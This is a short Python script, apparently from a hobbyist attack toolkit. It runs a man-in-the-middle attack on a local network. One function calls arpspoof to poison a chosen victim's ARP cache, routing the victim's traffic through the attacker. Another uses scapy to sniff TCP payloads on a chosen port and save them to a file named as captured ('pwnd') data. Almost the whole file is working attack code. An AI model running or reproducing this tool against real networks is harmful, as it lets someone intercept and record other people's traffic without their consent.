import socket
socket.has_ipv6=False
from scapy.all import *
from scapy.layers.inet import TCP
from helpers.utils import *
import os

def arpoisoner(out_lck):

    output(out_lck, "Arp Poisoner")

    intf = loop_input(out_lck, "Please insert interface's name: ")

    victimip = loop_input(out_lck, "Please insert victim IP (Ex 0.10): ")

    gatewayip = loop_input(out_lck, "Please insert gateway IP: ")

    os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % (intf, "192.168." + victimip, "192.168." + gatewayip))

#si so che è na porcata ma non mi viene in mente un modo migliore di farlo e si, non posso passare il file in prn
file = open("received/pwndcifrato.txt", "wb")


def out_sniff(packet):
    file.write(bytes(packet[TCP].payload))


def analyzer(out_lck):

    output(out_lck, "Analizer")

    protocol = loop_input(out_lck, "Please insert protocol: (Ex 'tcp' or 'udp')")

    port = loop_int_input(out_lck, "Please insert port number: ")

    time = loop_int_input(out_lck, "Please insert a timeout for the sniffer (in second): ")

    sniff(filter="%s and port %s" % (protocol, port), timeout=time, prn=out_sniff)

    file.close()



